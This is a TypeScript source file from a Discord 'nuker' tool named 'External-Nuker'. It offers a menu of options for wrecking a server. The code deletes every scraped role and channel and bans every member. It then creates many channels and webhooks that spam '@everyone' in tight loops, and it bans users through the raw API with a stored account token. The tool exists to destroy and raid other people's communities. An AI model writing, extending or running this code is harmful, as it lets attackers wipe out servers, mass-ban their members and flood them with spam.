import scrapeModel from "../models/scrape";
import { white } from "chalk";
import templates from "../models/templates";
import { createString } from "../utils/createString";
import { getTheme } from "../utils/getTheme";
import { logo } from "../utils/logo";
import { main } from "./main";
import wizzOptions from "../utils/wizzOptions";
const requests = require("request");
import settingsNukeDef from "../models/setting-scrape-delnuke";
import { scrape as scraperGO } from "./scrape";
import { rapid } from "./rapidTitlePromise";

async function BanUser(guild, memberid, db, reason = null) {
  const ops = {
    url: `https://discord.com/api/v8/guilds/${guild}/bans/${memberid}`,
    headers: {
      Authorization: `${db.get("curtoken")}`,
      "content-type": "application/json",
      "user-agent":
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
    },
    json: {
      reason: `${reason}`,
    },
  };
  let mainColor = getTheme(db);
  requests.put(ops.url, (error, response, data) => {
    if (error) {
      console.log(error);
    } else if (response.statusCode == 429) {
    } else if (response.statusCode == 204) {
      console.log(
        createString(`Successfully banned ${mainColor(memberid)}`, db, "semi")
      );
    } else if (response.statusCode == 200) {
      console.log(
        createString(`Successfully banned ${mainColor(memberid)}`, db, "semi")
      );
    } else if (response.statusCode == 201) {
      console.log(
        createString(`Successfully banned ${mainColor(memberid)}`, db, "semi")
      );
    }
  });
}

async function mainWizz(
  client,
  db,
  rl,
  guildID,
  channelName,
  channelAmount,
  roleName,
  roleAmount,
  webhookName
) {
  function nukeStr(str, type) {
    let r = `${mainColor("[")}${white(
      type === "rateLimit"
        ? "!"
        : type === "success"
        ? "+"
        : type === "fail"
        ? "-"
        : ""
    )}${mainColor("]")} ${white(str)}`;
    return r;
  }
  let mainColor = getTheme(db);
  if (!client.guilds.cache.has(guildID)) {
    console.log(createString("Unknown server", db, "semi", "fail"));
    setTimeout(() => {
      main(db, rl, client);
    }, 1000);
    return;
  }
  let D = <unknown>await scrapeModel.findOne({
    Username: db.get("username"),
    Guild: guildID,
  });
  interface templateData {
    Roles: String[];
    Channels: String[];
    Members: String[];
  }
  let data = <templateData>D;
  if (!data) {
    console.log(" ");
    console.log(
      createString("There is no scrape data for the server", db, "semi", "fail")
    );
    setTimeout(() => {
      main(db, rl, client);
    }, 2000);
    return;
  }
  let server = client.guilds.cache.get(guildID);

  // console.log(server)

  // if (
  //   !server.me.hasPermissions([
  //     "BAN_MEMBERS",
  //     "MANAGE_CHANNELS",
  //     "MANAGE_ROLES",
  //   ])
  // ) {
  //   process.title = "[External-Nuker] - Missing permissions";
  //   console.log(createString("Failed to find required permissions", db));
  //   console.log(" ");
  //   rl.question(createString("Type anything to continue", db), () => {
  //     main(db, rl, client);
  //   });
  //   return;
  // }

  process.title = `[External-Nuker] - Nuking ${server.name}`;

  let rolesArr = data.Roles;

  client.on("rateLimit", () => {
    console.log(nukeStr("Rate limited sleeping", "rateLimit"));
  });

  rolesArr.map(async (roleID) => {
    let role = server.roles.cache.get(roleID);
    role
      .delete()
      .then((r) => {
        console.log(nukeStr(`Deleted role ${r.id}`, "success"));
      })
      .catch(() => {
        console.log(nukeStr(`Failed to delete role ${roleID}`, "fail"));
      });
  });

  let hasSettingScrapeNuke = settingsNukeDef.findOne({
    Username: db.get("username"),
  });
  if (hasSettingScrapeNuke) {
    scrapeModel
      .deleteOne({ Username: db.get("username"), Guild: guildID })
      .exec();
  }
  let channelArr = data.Channels;

  channelArr.map(async (channelID) => {
    let channel = server.channels.cache.get(channelID);
    (await channel.fetch())
      .delete()
      .then((r) => {
        console.log(nukeStr(`Deleted channel ${r.id}`, "success"));
      })
      .catch(() => {
        console.log(nukeStr(`Failed to delete channel ${channelID}`, "fail"));
      });
  });

  let membersArr = data.Members;

  membersArr.map(async (memID) => {
    server.members
      .ban(memID)
      .then(() => {
        console.log(nukeStr(`Banned member ${memID}`, "success"));
      })
      .catch(() => {
        console.log(nukeStr(`Failed to ban member ${memID}`, "fail"));
      });
  });

  // server.channels.cache.map((ch) => {
  //   ch.delete()
  //     .then((c) => {
  //       console.log(nukeStr(`Deleted channel ${c.id}`, "success"));
  //     })
  //     .catch(() => {
  //       console.log(
  //         nukeStr(`Failed to delete channel ${ch.id}`, "fail")
  //       );
  //     });
  // });
  for (let i = 0; i < Number(channelAmount); i++) {
    server.channels
      .create(channelName)
      .then((x) => {
        console.log(nukeStr(`Created channel ${x.id}`, "success"));
        x.createWebhook(webhookName)
          .then((hook) => {
            console.log(nukeStr(`Created webhook ${webhookName}`, "success"));
            setInterval(() => {
              hook
                .send(`@everyone`)
                .then((mm) => {
                  console.log(
                    nukeStr(`Sent webhook webhook message ${mm.id}`, "success")
                  );
                })
                .catch(() => {
                  console.log(
                    nukeStr(`Failed to send webhook message`, "fail")
                  );
                });
            });
          })
          .catch(() => {
            console.log(nukeStr("Failed to create webhook", "fail"));
          });
        setInterval(() => {
          x.send(`@everyone`)
            .then((m) => {
              console.log(nukeStr(`Sent channel message ${m.id}`, "success"));
            })
            .catch(() => {
              console.log(nukeStr("Failed to send channel message", "fail"));
            });
        });
      })
      .catch(() => {
        console.log(nukeStr(`Failed to create channel`, "fail"));
      });
  }
  for (let i = 0; i < Number(roleAmount); i++) {
    server.roles
      .create({ data: { name: roleName, color: "RANDOM" } })
      .then((x) => {
        console.log(nukeStr(`Created role ${x.id}`, "success"));
      })
      .catch(() => {
        console.log(nukeStr(`Failed to create role`, "fail"));
      });
  }
}

function checkConfigBefore(db, guildID) {
  let c = null;
  if (db.has(`settings.scrape.checknuke`)) {
    if (db.get(`settings.scrape.checknuke`) === true) {
      if (!db.has(`scrape_${guildID}`)) c = "NONE";
    }
  }
  return c;
}

async function wizz(client, db, rl) {
  rapid("[External-Nuker] - Wizz", 1).then(() => {
    setTimeout(() => {
      process.title = "[External-Nuker] - Wizz";
    }, 40);
  });
  console.clear();
  wizzOptions(db);
  rl.question(createString("Enter option", db), async (option) => {
    if (
      ![
        "menu",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "x",
        "c",
        "v",
      ].includes(option)
    ) {
      console.log(createString("Unknown option", db, "semi", "fail"));
      setTimeout(() => {
        wizz(client, db, rl);
      }, 1000);
      return;
    }
    if (option === "menu") {
      main(db, rl, client);
      return;
    }
    if (option === "9") {
      scraperGO(rl, db, client);
      return;
    }
    rl.question(createString("Enter guild ID", db), async (guildID) => {
      if (guildID === "menu") {
        main(db, rl, client);
        return;
      }
      let x = client.guilds.cache.get(guildID);
      if (!x) {
        process.title = "[External-Nuker] - Unknown server";
        console.log(createString("Unknown server", db, "semi", "fail"));
        setTimeout(() => {
          wizz(client, db, rl);
        }, 2000);
        return;
      }
      if (option === "menu") {
        main(db, rl, client);
        return;
      }
      client.on("rateLimit", async () => {
        let mainColor = getTheme(db);
        console.log(
          mainColor("[") +
            white("!") +
            mainColor("] ") +
            white("Rate limited.. Starting to sleep..")
        );
      });
      let server = client.guilds.cache.get(guildID);
      if (option === "1") {
        console.clear();
        logo(db);
        let tems = await templates.find({ Username: db.get("username") });
        let arr = [];
        tems.map(<x>(tem) => {
          arr.push(tem.Name);
        });
        console.log(createString("Templates:", db, "semi"));
        console.log(arr.join("\n"));
        console.log(" ");
        rl.question(createString("Enter template name", db), async (name) => {
          if (name === "menu") {
            main(db, rl, client);
            return;
          }
          if (!arr.includes(name)) {
            console.log(createString("Invalid template", db, "semi", "fail"));
            setTimeout(() => {
              wizz(client, db, rl);
            }, 2000);
            return;
          }
          interface templateData {
            ChannelName: String;
            ChannelAmount: Number;
            RoleName: String;
            RoleAmount: Number;
            WebhookName: String;
          }

          let data = <unknown>await templates.findOne({
            Username: db.get("username"),
            Name: name,
          });
          rl.question(createString("Enter guild ID", db), (guildID) => {
            let d = <templateData>data;
            mainWizz(
              client,
              db,
              rl,
              guildID,
              d.ChannelName,
              d.ChannelAmount,
              d.RoleName,
              d.RoleAmount,
              d.WebhookName
            );
          });
        });
      }
      if (option === "2") {
        if (!server.me.hasPermission("BAN_MEMBERS")) {
          process.title = "[External-Nuker] - Missing ban permissions";
          console.log(
            createString(
              "Failed to find needed permissions",
              db,
              "semi",
              "fail"
            )
          );
          setTimeout(() => {
            wizz(client, db, rl);
          }, 1000);
          return;
        }
        require("./nuke/ban")(client, db, rl, guildID);
      }
      if (option === "3") {
        if (!server.me.hasPermission("KICK_MEMBERS")) {
          process.title = "[External-Nuker] - Missing kick permissions";
          console.log(
            createString(
              "Failed to find needed permissions",
              db,
              "semi",
              "fail"
            )
          );
          setTimeout(() => {
            wizz(client, db, rl);
          }, 1000);
          return;
        }
        require("./nuke/kick")(client, db, rl, guildID);
      }
      if (option === "4") {
        if (!server.me.hasPermission("MANAGE_CHANNELS")) {
          process.title =
            "[External-Nuker] - Missing manage channel permissions";
          console.log(
            createString(
              "Failed to find needed permissions",
              db,
              "semi",
              "fail"
            )
          );
          setTimeout(() => {
            wizz(client, db, rl);
          }, 1000);
          return;
        }
        require("./nuke/createChannels")(client, db, rl, guildID);
      }
      if (option === "5") {
        if (!server.me.hasPermission("MANAGE_CHANNELS")) {
          process.title =
            "[External-Nuker] - Missing manage channel permissions";
          console.log(
            createString(
              "Failed to find needed permissions",
              db,
              "semi",
              "fail"
            )
          );
          setTimeout(() => {
            wizz(client, db, rl);
          }, 1000);
          return;
        }
        require("./nuke/delChannels")(client, rl, db, guildID);
      }
      if (option === "6") {
        if (!server.me.hasPermission("MANAGE_ROLES")) {
          process.title = "[External-Nuker] - Missing manage role permissions";
          console.log(
            createString(
              "Failed to find needed permissions",
              db,
              "semi",
              "fail"
            )
          );
          setTimeout(() => {
            wizz(client, db, rl);
          }, 1000);
          return;
        }
        require("./nuke/createRoles")(client, db, rl, guildID);
      }
      if (option === "7") {
        if (!server.me.hasPermission("MANAGE_ROLES")) {
          process.title = "[External-Nuker] - Missing manage role permissions";
          console.log(
            createString(
              "Failed to find needed permissions",
              db,
              "semi",
              "fail"
            )
          );
          setTimeout(() => {
            wizz(client, db, rl);
          }, 1000);
          return;
        }
        require("./nuke/delRoles")(client, rl, db, guildID);
      }
      if (option === "8") {
        require("./nuke/spamWebhooks")(client, rl, db, guildID);
      }
      if (option === "x" || option === "z" || option === "c") {
        setTimeout(() => {
          wizz(client, db, rl);
        }, 1500);
        console.log(createString("Coming soon..", db, "semi", "fail"));
      }
    });
  });
}

export { wizz };
